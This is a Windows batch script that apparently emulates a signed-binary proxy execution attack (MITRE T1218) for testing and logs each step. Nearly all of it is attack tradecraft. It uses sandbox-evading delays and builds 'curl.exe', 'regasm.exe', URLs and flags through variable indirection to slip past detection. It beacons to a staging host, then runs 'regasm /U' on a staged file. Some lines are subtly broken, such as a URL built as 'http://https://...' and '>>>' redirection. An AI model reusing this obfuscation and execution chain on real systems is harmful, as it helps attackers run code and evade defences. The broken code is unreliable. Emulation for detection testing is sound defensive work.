@echo off
SETLOCAL EnableDelayedExpansion

REM PHR_ constants (plain literals - NEVER obfuscated)
SET txisnba=%APPDATA%\7846\30abf0a6
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?7846-10
SET jwcnifl=ITZEL-S2BO
SET rrocubc=10
SET xzanpex=teams.txt
SET dvhhyc=7846

REM Debug logging variable
SET logvar=!APPDATA!\!rrocubc!\macula-simulations.log

REM Initial delay 45 seconds
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: initial_delay_start=45s>>> "!logvar!" 2>nul
timeout /t 45 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: initial_delay_complete>>> "!logvar!" 2>nul

REM Random delay 10-30 seconds
SET /A delayvar=!RANDOM! %% 20 + 10
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: random_delay_start=!delayvar!s>>> "!logvar!" 2>nul
timeout /t !delayvar! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: random_delay_complete>>> "!logvar!" 2>nul

REM Obfuscate curl.exe using variable indirection
SET partA=curl
SET partB=.e
SET partC=xe
SET partD=%partA%%partB%%partC%
SET ref1=partD
CALL SET curlbin=%%!ref1!%%

REM Obfuscate regasm.exe using multiple indirection layers
SET binA=reg
SET binB=asm
SET binC=.exe
SET tool1=binA
SET tool2=binB
SET tool3=binC
CALL SET toolpart1=%%!tool1!%%
CALL SET toolpart2=%%!tool2!%%
CALL SET toolpart3=%%!tool3!%%
SET regasmbinary=!toolpart1!!toolpart2!!toolpart3!

REM Obfuscate command arguments
SET slashU=/U
SET slashvar=slashU

REM Build URL with variable indirection
SET urlproto=http
SET urlsuffix=://
SET urlpart1=urlproto
SET urlpart2=urlsuffix
CALL SET urlprefix=%%!urlpart1!%%%%!urlpart2!%%
SET fullurl=!urlprefix!!mdvfmsbx!

REM Obfuscate curl flags
SET flag1=-k
SET flag2=-s
SET flag3=-o
SET flag4=nul
SET fref1=flag1
SET fref2=flag2
SET fref3=flag3
SET fref4=flag4
CALL SET curlflag1=%%!fref1!%%
CALL SET curlflag2=%%!fref2!%%
CALL SET curlflag3=%%!fref3!%%
CALL SET curlflag4=%%!fref4!%%

REM Heartbeat check
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_check_start=!keghkgto!>>> "!logvar!" 2>nul
%curlbin% !curlflag1! !curlflag2! !curlflag3! !curlflag4! "!fullurl!/!keghkgto!"
SET /A hb_result=%ERRORLEVEL%
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_check_complete=!hb_result!>>> "!logvar!" 2>nul

REM Delay between operations 15 seconds
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: interop_delay_start=15s>>> "!logvar!" 2>nul
ping -n 16 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: interop_delay_complete>>> "!logvar!" 2>nul

REM Change directory
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: chdir_start=!txisnba!>>> "!logvar!" 2>nul
cd /d "!txisnba!"
SET /A cd_result=%ERRORLEVEL%
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: chdir_complete=!cd_result!>>> "!logvar!" 2>nul

REM Execute regasm with obfuscated arguments
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: regasm_exec_start=!xzanpex!>>> "!logvar!" 2>nul
CALL SET uflag=%%!slashvar!%%
%regasmbinary% !uflag! "!xzanpex!"
SET /A exec_result=%ERRORLEVEL%
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: regasm_exec_complete=!exec_result!>>> "!logvar!" 2>nul

REM TTP logging for T1218
IF !exec_result! EQU 0 (
    SET resval=1
    SET errdetail=
) ELSE (
    SET resval=0
    SET errdetail=exec_failed_!exec_result!
)

REM Normalize timestamp
SET normdate=!DATE:~-4!-!DATE:~3,2!-!DATE:~0,2!
SET normtime=!TIME:~0,2!:!TIME:~3,2!:!TIME:~6,2!.!TIME:~9,3!

REM Write TTP log
(echo [!normdate! !normtime!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed Binary Proxy Execution=!resval!:!errdetail!) >> "!logvar!" 2>nul

REM Final delay 12 seconds
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: final_delay_start=12s>>> "!logvar!" 2>nul
CHOICE /C Y /N /D Y /T 12 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: final_delay_complete>>> "!logvar!" 2>nul

ENDLOCAL